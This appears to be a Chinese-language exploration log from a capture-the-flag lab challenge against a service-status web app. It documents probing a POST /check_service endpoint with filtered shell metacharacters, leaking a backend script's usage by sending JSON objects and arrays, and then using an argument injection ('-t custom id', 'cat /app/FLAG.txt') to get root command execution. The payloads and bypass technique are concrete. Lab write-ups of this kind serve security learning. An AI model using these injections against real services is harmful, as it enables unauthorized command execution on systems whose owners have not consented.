# xben-068-24 · 探索记录

对应题解：[`xben-068-24.md`](./xben-068-24.md)

## 目标与起点

`10.0.172.219:80`，Service Status Dashboard，`POST /check_service`。

## 第一阶段：确认有过滤

| service_name | 结果 |
| --- | --- |
| `apache` | `{"status":"true"}` |
| `;id` / `&& id` / `|id` / `$(id)` / 换行 | 400 `Invalid service name` |
| `apache'` | 500 `Service check failed` |

## 第二阶段：用非字符串骗出 usage

| 输入 | 结果 |
| --- | --- |
| `{"service_name": {"a":1,"b":2}}` | 回显 `check_service.sh` 的 usage，含 `-t custom` 类型 |
| `{"service_name": ["-t","x","y"]}` | 同一份 usage（参数过多） |

## 第三阶段：参数注入

| service_name | 结果 |
| --- | --- |
| `-t custom id` | `uid=0(root) ...` |
| `-t custom "ls -la /app"` | 看到 `FLAG.txt`、`app.py`、`check_service.sh` |
| `-t custom "cat /app/FLAG.txt"` | **flag** |

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `;` / `&&` / `$()` | 400 | 字符白名单 |
| `apache ` 带空格 | 200 true | 空格本身不拦，但会导致「参数过多」 |
| 直接 `cat /FLAG.txt` | false | flag 在 `/app/FLAG.txt` |

## 这次真正的收获

1. 参数越多「报 usage」越容易；用对象/数组制造参数个数错误，就能拿到后端用法说明。
2. 脚本自带 `-t custom` 这种能力时，注入目标是**选项**而不是 shell 元字符。
